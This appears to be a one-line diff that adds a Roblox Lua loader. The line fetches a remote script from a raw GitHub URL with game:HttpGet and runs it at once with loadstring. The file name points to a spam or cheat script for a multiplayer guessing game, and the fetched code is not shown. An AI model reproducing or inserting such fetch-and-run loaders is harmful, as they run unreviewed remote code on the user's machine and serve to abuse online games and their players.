@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/2-player-guess-the-anime-character-spam2-w6cfzjoaoed848.lua"))()
